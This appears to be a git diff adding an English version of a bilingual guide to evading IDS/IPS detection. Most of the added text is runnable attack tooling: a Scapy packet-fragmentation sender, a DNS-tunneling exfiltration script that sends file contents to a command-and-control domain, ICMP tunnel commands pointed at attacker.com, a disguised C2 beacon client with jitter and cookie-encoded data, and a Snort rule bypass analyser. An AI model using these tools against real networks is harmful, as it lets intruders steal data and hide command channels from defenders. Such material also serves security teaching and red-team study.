@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # IDS/IPS 우회 — 패킷 조작·프로토콜 혼용·트래픽 분석
 
 ## 1. IDS/IPS 탐지 메커니즘
@@ -461,3 +467,471 @@ if __name__ == "__main__":
 | 암호화 트래픽 | 페이로드 기반 | TLS 내용 불가시 |
 | 슬로우 스캔 | 이상 탐지 | 기준선 내 수준 |
 | 소스 IP 분산 | 횟수 기반 | IP당 임계치 미달 |
+
+---
+
+<a name="english"></a>
+
+# IDS/IPS Evasion — Packet Manipulation, Protocol Mixing, Traffic Analysis
+
+## 1. IDS/IPS Detection Mechanisms
+
+| Detection Method   | Description                                  |
+|--------------------|----------------------------------------------|
+| Signature-based    | Known attack patterns (Snort rules)          |
+| Anomaly detection  | Deviation from normal traffic baseline       |
+| Protocol analysis  | Detection of RFC violations                  |
+| Behavioral analysis| Connection pattern and frequency analysis    |
+| Stateful           | TCP session state tracking                   |
+
+---
+
+## 2. Packet Fragmentation Bypass
+
+```python
+#!/usr/bin/env python3
+"""Split IDS signatures via packet fragmentation (educational — Scapy-based)."""
+
+import argparse
+from scapy.all import IP, TCP, fragment, send, Raw
+
+
+def send_fragmented_payload(
+    dst_ip: str,
+    dst_port: int,
+    payload: bytes,
+    fragment_size: int = 8,
+    src_ip: str = "0.0.0.0",
+) -> None:
+    """Split payload into small IP fragments to evade IDS signature detection."""
+    pkt = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=54321, flags="PA") / Raw(load=payload)
+    fragments = fragment(pkt, fragsize=fragment_size)
+    print(f"[*] Split into {len(fragments)} fragments (fragment size: {fragment_size} bytes)")
+    send(fragments, verbose=False)
+    print(f"[+] Transmission complete: {len(payload)} bytes → {dst_ip}:{dst_port}")
+
+
+def send_out_of_order(
+    dst_ip: str,
+    dst_port: int,
+    payload: bytes,
+) -> None:
+    """Send TCP segments in reverse order — bypass some IDS reassembly."""
+    from scapy.all import RandShort
+
+    chunk_size = len(payload) // 3
+    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
+
+    sport = int(RandShort())
+    seq = 1000
+
+    # Send in reverse order (last → first)
+    for i, chunk in enumerate(reversed(chunks)):
+        offset = len(payload) - (i + 1) * chunk_size
+        pkt = IP(dst=dst_ip) / TCP(
+            dport=dst_port, sport=sport,
+            seq=seq + offset, flags="PA"
+        ) / Raw(load=chunk)
+        send(pkt, verbose=False)
+
+    print(f"[+] Sent {len(chunks)} segments in reverse order")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Packet fragmentation IDS bypass (educational)")
+    parser.add_argument("dst_ip", help="Target IP")
+    parser.add_argument("dst_port", type=int, help="Target port")
+    parser.add_argument("payload", help="Payload to send (string)")
+    parser.add_argument("--fragment-size", type=int, default=8, help="Fragment size (bytes)")
+    parser.add_argument("--out-of-order", action="store_true", help="Send in reverse order")
+    args = parser.parse_args()
+
+    payload = args.payload.encode()
+    if args.out_of_order:
+        send_out_of_order(args.dst_ip, args.dst_port, payload)
+    else:
+        send_fragmented_payload(args.dst_ip, args.dst_port, payload, args.fragment_size)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. Protocol Tunneling
+
+### 3.1 DNS Tunneling
+
+```python
+#!/usr/bin/env python3
+"""DNS tunneling — encode data in DNS queries (educational)."""
+
+import argparse
+import base64
+import socket
+import struct
+from pathlib import Path
+
+
+def encode_data_as_dns_label(data: bytes) -> list[str]:
+    """Encode data as DNS labels (63 character limit)."""
+    encoded = base64.b32encode(data).decode().lower().rstrip("=")
+    return [encoded[i:i+60] for i in range(0, len(encoded), 60)]
+
+
+def build_dns_query(hostname: str, qtype: int = 1) -> bytes:
+    """Build DNS query packet."""
+    transaction_id = 0x1234
+    flags = 0x0100  # Recursive query
+    qdcount = 1
+
+    header = struct.pack(">HHHHHH", transaction_id, flags, qdcount, 0, 0, 0)
+
+    # Encode hostname
+    labels = b""
+    for part in hostname.split("."):
+        labels += bytes([len(part)]) + part.encode()
+    labels += b"\x00"
+
+    question = labels + struct.pack(">HH", qtype, 1)  # A record, IN class
+    return header + question
+
+
+def dns_exfil(data: bytes, domain: str, dns_server: str = "8.8.8.8") -> int:
+    """Simulate data exfiltration via DNS queries."""
+    labels = encode_data_as_dns_label(data)
+    sent_chunks = 0
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(2)
+
+    for i, label in enumerate(labels):
+        hostname = f"{label}.chunk{i}.{domain}"
+        query = build_dns_query(hostname)
+        try:
+            sock.sendto(query, (dns_server, 53))
+            sent_chunks += 1
+        except OSError:
+            pass
+
+    sock.close()
+    return sent_chunks
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="DNS tunneling simulator (educational)")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    exfil_p = sub.add_parser("exfil", help="Simulate data exfiltration via DNS")
+    exfil_p.add_argument("data", help="Data to exfiltrate (string) or file path")
+    exfil_p.add_argument("domain", help="C2 domain")
+    exfil_p.add_argument("--dns", default="127.0.0.1", help="DNS server")
+
+    encode_p = sub.add_parser("encode", help="Encode data as DNS labels")
+    encode_p.add_argument("data")
+    encode_p.add_argument("domain")
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "exfil":
+            if Path(args.data).exists():
+                data = Path(args.data).read_bytes()
+            else:
+                data = args.data.encode()
+
+            print(f"[*] {len(data)} bytes → split into DNS queries")
+            chunks = dns_exfil(data, args.domain, args.dns)
+            print(f"[+] {chunks} DNS queries sent")
+
+        case "encode":
+            labels = encode_data_as_dns_label(args.data.encode())
+            for i, label in enumerate(labels):
+                print(f"{label}.chunk{i}.{args.domain}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3.2 ICMP Tunneling
+
+```bash
+# icmptunnel — encapsulate TCP/IP in ICMP payload
+# Server (attacker side)
+icmptunnel -s
+
+# Client (victim side)
+icmptunnel -c attacker.com
+
+# ptunnel-ng — ICMP-based SSH tunnel
+ptunnel-ng -r attacker.com -rp 22 -lp 2222  # Client
+ptunnel-ng -x PASSWORD  # Server
+ssh user@localhost -p 2222
+```
+
+---
+
+## 4. Traffic Disguise Techniques
+
+```python
+#!/usr/bin/env python3
+"""Disguise C2 traffic as legitimate traffic — HTTP Malleable C2 style."""
+
+import argparse
+import base64
+import json
+import random
+import time
+from datetime import datetime
+
+import httpx
+
+
+# User-Agent list for disguising as legitimate traffic
+LEGITIMATE_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+]
+
+# CDN disguise headers
+CDN_HEADERS = {
+    "CF-Cache-Status": "MISS",
+    "CF-Ray": f"{random.randint(0, 0xFFFFFFFF):08x}-ICN",
+    "X-Cache": "Miss from cloudfront",
+    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8",
+    "Accept-Encoding": "gzip, deflate, br",
+}
+
+
+def encode_c2_data(data: dict) -> str:
+    """Encode C2 data into an innocuous-looking Cookie format."""
+    raw = json.dumps(data).encode()
+    encoded = base64.urlsafe_b64encode(raw).decode()
+    # Disguise as cookie format
+    return f"session_id={encoded[:32]}; _ga=GA1.2.{random.randint(1000000, 9999999)}.{int(time.time())}"
+
+
+def decode_c2_data(cookie: str) -> dict | None:
+    """Extract C2 data from disguised cookie."""
+    try:
+        session_part = [p for p in cookie.split(";") if "session_id=" in p]
+        if not session_part:
+            return None
+        encoded = session_part[0].split("=", 1)[1].strip()
+        raw = base64.urlsafe_b64decode(encoded + "==")
+        return json.loads(raw)
+    except Exception:
+        return None
+
+
+def jitter_sleep(base_seconds: float, jitter_pct: float = 0.3) -> None:
+    """Sleep with jitter — prevent regular beacon detection."""
+    jitter = base_seconds * jitter_pct * random.uniform(-1, 1)
+    time.sleep(max(0, base_seconds + jitter))
+
+
+class C2Client:
+    def __init__(
+        self,
+        c2_url: str,
+        beacon_interval: float = 60.0,
+    ) -> None:
+        self.c2_url = c2_url
+        self.beacon_interval = beacon_interval
+        self.session_id = base64.urlsafe_b64encode(
+            random.randbytes(16)
+        ).decode().rstrip("=")
+
+    def beacon(self, command_output: str | None = None) -> dict | None:
+        headers = {
+            "User-Agent": random.choice(LEGITIMATE_USER_AGENTS),
+            "Cookie": encode_c2_data({
+                "sid": self.session_id,
+                "ts": datetime.now().isoformat(),
+                "output": command_output or "",
+            }),
+            **CDN_HEADERS,
+        }
+
+        try:
+            with httpx.Client(verify=False) as client:
+                resp = client.get(
+                    self.c2_url,
+                    headers=headers,
+                    timeout=15,
+                    follow_redirects=True,
+                )
+                if resp.status_code == 200:
+                    return decode_c2_data(resp.headers.get("Set-Cookie", ""))
+        except httpx.RequestError:
+            pass
+
+        return None
+
+    def run(self, max_beacons: int = 10) -> None:
+        print(f"[*] C2 beacon started (interval: {self.beacon_interval}s, jitter: 30%)")
+        for i in range(max_beacons):
+            print(f"[*] Beacon #{i+1} → {self.c2_url}")
+            result = self.beacon()
+            if result:
+                print(f"[+] Command received: {result}")
+            jitter_sleep(self.beacon_interval)
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Traffic disguise C2 simulator (educational)")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    beacon_p = sub.add_parser("beacon", help="C2 beacon simulation")
+    beacon_p.add_argument("url", help="C2 server URL")
+    beacon_p.add_argument("--interval", type=float, default=60.0)
+    beacon_p.add_argument("--count", type=int, default=5)
+
+    encode_p = sub.add_parser("encode", help="Encode data")
+    encode_p.add_argument("data", help="JSON data to encode")
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "beacon":
+            client = C2Client(args.url, args.interval)
+            client.run(args.count)
+        case "encode":
+            data = json.loads(args.data)
+            print(encode_c2_data(data))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. Snort Rule Bypass Analysis
+
+```python
+#!/usr/bin/env python3
+"""Snort/Suricata rule analysis — detect bypassable patterns."""
+
+import argparse
+import re
+from dataclasses import dataclass
+from pathlib import Path
+
+
+@dataclass
+class SnortRule:
+    action: str
+    protocol: str
+    src: str
+    dst: str
+    options: dict[str, str]
+    raw: str
+
+
+def parse_snort_rule(line: str) -> SnortRule | None:
+    """Parse Snort rule."""
+    pattern = re.compile(
+        r'(alert|drop|pass|reject)\s+(tcp|udp|icmp|ip)\s+'
+        r'(\S+)\s+(\S+)\s+->\s+(\S+)\s+(\S+)\s+\((.+)\)'
+    )
+    m = pattern.match(line.strip())
+    if not m:
+        return None
+
+    options_str = m.group(7)
+    options: dict[str, str] = {}
+    for opt in options_str.split(";"):
+        opt = opt.strip()
+        if ":" in opt:
+            k, v = opt.split(":", 1)
+            options[k.strip()] = v.strip().strip('"')
+        elif opt:
+            options[opt] = ""
+
+    return SnortRule(
+        action=m.group(1),
+        protocol=m.group(2),
+        src=f"{m.group(3)} {m.group(4)}",
+        dst=f"{m.group(5)} {m.group(6)}",
+        options=options,
+        raw=line,
+    )
+
+
+def analyze_bypass_potential(rule: SnortRule) -> list[str]:
+    """Analyze potential bypass vectors in the rule."""
+    bypasses = []
+    content = rule.options.get("content", "")
+    nocase = "nocase" in rule.options
+
+    if content and not nocase:
+        bypasses.append(f"Case bypass: content='{content}' missing nocase keyword")
+
+    if "depth" not in rule.options and content:
+        bypasses.append("No depth specified — bypassable via offset manipulation")
+
+    if "flow" not in rule.options:
+        bypasses.append("No flow specified — bypassable by reversing request/response direction")
+
+    if rule.protocol == "tcp" and "flags" not in rule.options:
+        bypasses.append("TCP flags not specified — bypassable with non-standard flags")
+
+    pcre = rule.options.get("pcre", "")
+    if pcre and "/i" not in pcre:
+        bypasses.append(f"PCRE case-insensitive flag not applied: {pcre}")
+
+    return bypasses
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Snort rule bypass analysis")
+    parser.add_argument("rules_file", type=Path, help="Snort rules file")
+    parser.add_argument("--keyword", help="Filter by specific keyword")
+    args = parser.parse_args()
+
+    rules = args.rules_file.read_text(encoding="utf-8", errors="ignore").splitlines()
+    parsed_rules = []
+
+    for line in rules:
+        if line.strip().startswith("#") or not line.strip():
+            continue
+        rule = parse_snort_rule(line)
+        if rule:
+            parsed_rules.append(rule)
+
+    print(f"[*] Parsed {len(parsed_rules)} rules")
+
+    if args.keyword:
+        parsed_rules = [r for r in parsed_rules if args.keyword.lower() in r.raw.lower()]
+
+    for rule in parsed_rules:
+        bypasses = analyze_bypass_potential(rule)
+        if bypasses:
+            sid = rule.options.get("sid", "?")
+            msg = rule.options.get("msg", "")
+            print(f"\n[!] SID {sid}: {msg}")
+            for b in bypasses:
+                print(f"  → {b}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. IDS/IPS Evasion Summary
+
+| Technique               | Target IDS Type       | Reason Detection Is Difficult          |
+|-------------------------|-----------------------|----------------------------------------|
+| IP fragmentation        | Signature-based       | Signature is split across fragments    |
+| TCP segment overlap     | Stateful tracking     | Differences in reassembly policy       |
+| Unicode/encoding        | Signature-based       | Bypasses character set normalization   |
+| Protocol tunneling      | Port-based            | Uses legitimate ports                  |
+| Encrypted traffic       | Payload-based         | TLS content is not visible             |
+| Slow scan               | Anomaly detection     | Stays within baseline thresholds       |
+| Source IP distribution  | Count-based           | Stays below per-IP threshold           |
